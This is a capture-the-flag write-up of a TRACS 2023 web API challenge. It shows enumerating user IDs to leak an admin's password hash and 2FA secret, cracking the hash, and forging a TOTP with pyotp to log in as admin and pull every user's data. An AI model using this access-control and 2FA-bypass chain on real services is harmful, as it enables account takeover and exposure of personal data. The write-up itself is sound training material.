---
layout: writeup
category: TRACS2023
chall_description: 
points: 150
solves: 16
tags: Web API
date: 2023-12-13
comments: false
---

## ## Challenge Description

This is a Web API Challenge from the event TRACS 2023 (Tournoi de Renseignement et d'Analyse de CentraleSupélec). It was such a great experience and I have learnt a lot from it, so here is a solution for a challenge. However we are not allowed to take photos during the event and I also forgot to snip the screen, so I dont have many photos to show, but the files I acquired during the challenge.

To begin with, we have a cryptocurrency trading website with API, and we have to investigate a suspect of EvilCorp who is believed to be active on this site. 

## ## Solution

1. #### Flag 1: Account balance

   The first flag is quite simple: we have to login with given credentials: `emo@trade.local:demo` at the endpoint /api/login and get the account balance.

   After sending login request:

   ```bash
   $ curl -X POST http://nexicoins.tracs.viarezo.fr/api/login -H 'Content-Type: application/json' -d '{"email":"demo@trade.local", "password": "demo"} '
   {"access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcwMTUyMTIwNCwianRpIjoiM2I0MWY0ZWYtMGZjZS00NWQ5LTg2YTMtMTNiNjFjMjQ0ZGUzIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6MSwibmJmIjoxNzAxNTIxMjA0LCJleHAiOjE3MDE1MjIxMDR9.M6Yv8y2wHRGpHt82Kw66Qt51xyY7scrw7blClXBIIic"}
   ```

   We got a access_token, which is a JWT. To get the balance I use this code (It's my teammate [Kaiba404](congkhainguyen.github.io):

   ```python
   import requests
   
   url = "http://nexicoins.tracs.viarezo.fr/api/account/balance"
   access_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcwMTUyMTIwNCwianRpIjoiM2I0MWY0ZWYtMGZjZS00NWQ5LTg2YTMtMTNiNjFjMjQ0ZGUzIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6MSwibmJmIjoxNzAxNTIxMjA0LCJleHAiOjE3MDE1MjIxMDR9.M6Yv8y2wHRGpHt82Kw66Qt51xyY7scrw7blClXBIIic"
   
   headers = {
       "Authorization": f"Bearer {access_token}"
   }
   
   response = requests.get(url, headers=headers)
   
   if response.status_code == 200:
       # Request was successful
       print("Response:", response.json())
   else:
       # Request failed
       print(f"Error: {response.status_code}, {response.text}")
   ```

   And we got the first flag, which is the balance of the account demo 2.47$

2. #### Flag 2: Password hash of user admin

   While playing around with the endpoint /api/account/infos, I realized that this will return all infomation of our current account (id, email, hash, 2FA activated or not, balance, what type of coin and quantities). However, with Burp Suite, I can see a Header in the reponse packet `Location: /api/account/infos?id=1 `, and the id of user `demo` is 1.  I tried with id 0 but it doesnt exist, so after some tries, I know there are 1035 users in the database.

   So we can fuzz the endpoint with numbers and I guess the dev hid the admin among the normal one. To do this I used Burp Suite Intruder, with a wordlist 1-1035 and filter the result with `admin`. And this worked! At id 852 we have admin@trace.local and its hash:

   ```
   #PASSWORD admin: id 852 admin@trade.local : 2dab208fb73fb1e9444dfb9981ae7c71f0c54fdd746292db55b93cf880d6facf  
   #2FA: KFGWCURIIJDT6627K5CHAQ3VJ56UU332PNJHE2JXKFMDG4LBJVRQU
   ```

   so the flag is the hash we found.

   A bit curious, I tried to crack the hash and found the actual password of `admin:5874bon1440rev21`:

   ![image-20231215142147429](../../../\assets\CTFs\TRACS2023\hash_admin)

   We also have a page for /api/admin, however it was locked by a http authentication (.htpasswd), but now we can access to it and find out there exist 2 endpoint for `admin` and `admin` only: /api/admin/transactions and /api/admin/users

3. #### Flag 3: Marie Honnette Last IP address

   The suspect we need to investigate named Marie Honnette, and we can find her information the same way we did with admin:

   ```json
   {
   	"role": "user", 
   	"email": "marie.honnette@evilottery.ev", 
       "password": 		"4c504c9d0dce1700ae57a16147074820c0745b005bddcfb4a876a54c38389046", 	"2FA": "None", 
    	"balance": "307.28", 
   	 "stocks": [{"code": "HWN", "qty": 13.540588842504697}, {"code": "CYI", "qty": 3.444808330834581}, {"code": "TQK", "qty": 6.046132874644536}, {"code": "OUT", "qty": 16.35328518715449}, {"code": "THD", "qty": 9.108755215289444}, {"code": "OQN", "qty": 10.812927301654812}, {"code": "RLI", "qty": 18.653448986299026}, {"code": "JGD", "qty": 12.589059350125865}, {"code": "EYB", "qty": 5.932961914189468}]
   }
   ```

   Since we have the credential of admin, I know we have to take advantage of that, so I tried to login as admin, however this account's NFA was activated, and my attempt was failed because I had no TOPT.

   I had no idea how does it work to be honest, so I did some research about it: 

   > TOTP(Time-based One-Time Password ) is a type of password that are generated based on the time and a secret. It is the same way we received the OTP when we try to login into our Google account (or other services with 2FA) with a 6-digit code to verify ourselves. TOTP will expire after a moment

   And we've already had the 2FA secret of the user admin! So all we have to do is forging a TOTP, with the current time, and use it to login as admin. So I write the code bellow:

   ```python
   import pyotp
   import time
   from datetime import datetime
   
   def generate_totp_code(secret, time):
       totp = pyotp.TOTP(secret)
       time = int(time.timestamp())
       return totp.at(time)
   
   secret = "KFGWCURIIJDT6627K5CHAQ3VJ56UU332PNJHE2JXKFMDG4LBJVRQU"
   time = datetime(2023, 12, 2, 20, 15, 0)  
   totp = generate_totp_code(secret,time)
   
   print(totp)
   ```

   

And we got the access_token of the `admin`! Great!

So now we can access to /api/admin/users to collect information of all users of the system, and look up for Marie Honnette and voilà:

![image-20231215142147429](../../../\assets\CTFs\TRACS2023\tracs_marie_ip.png)

Here is the flag last_connection_ip : `10.30.95.127`



And that's all for this challenge. Quite interesting and I have learnt more about 2FA. Thank you for reading and see you around!

Happy Hacking!
